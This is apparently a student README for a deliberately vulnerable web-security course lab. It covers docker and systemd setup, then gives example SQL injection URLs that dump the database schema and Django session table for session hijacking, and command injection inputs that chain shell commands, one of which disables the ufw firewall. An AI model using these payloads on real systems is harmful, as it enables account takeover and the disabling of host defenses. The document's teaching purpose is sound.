# CN351-webSec

## SetUp project in visual machine
1. Clone project from github to `/home/kali/`
2. Install docker and docker-compose
```bash
$ sudo apt install docker.io
$ sudo systemctl enable docker --now
$ sudo usermod -aG docker $USER

$ sudo apt install docker-compose
```
3. Run docker-compose up -d
```bash ~/CN351-webSec
$ docker-compose up -d
```
4. setup requirement
```bash ~/CN351-webSec
$ sudo apt install pkg-config
$ sudo apt install python3-venv
$ sudo apt install python3-dev

$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip install -r requirements.txt
```
5. change database HOST <br>
    -- comment 'HOST': '127.0.0.1', <br>
    -- uncomment new HOST <br>
6. add service to `/etc/systemd/system`
```bash
$ sudo cp cn351.service /etc/systemd/system
```
7. enable service
```bash
$ sudo systemctl deamon-reload
$ sudo systemctl enable cn351
$ sudo systemctl start cn351
```

## SQL Injection
1. Go to http://<target-ip/domain>/?search=
2. Try to search with SQL Injection Example:
```url
/?search=' UNION SELECT table_schema,  table_name, NULL, NULL, NULL FROM information_schema.table_constraints;
/?search=' UNION SELECT *, NULL, NULL FROM db_websec.django_session;
```
3. Change sessionid to sessionid in django_session table

## Command Injection
1. Go to http://<target-ip/domain>/logging/?search=
2. Try to search with Command Injection Example:
```input
200 && echo $USER
```
```input
302 && systemctl list-units --type=service
```
```input
404 && ufw disable
```

## Group Member
1. 6410615022   ชัญญานุช จำนงนิตย์
2. 6410615113   พิชชากานต์ ลีพุด
3. 6410685215	พชรพล ทัพผักแว่น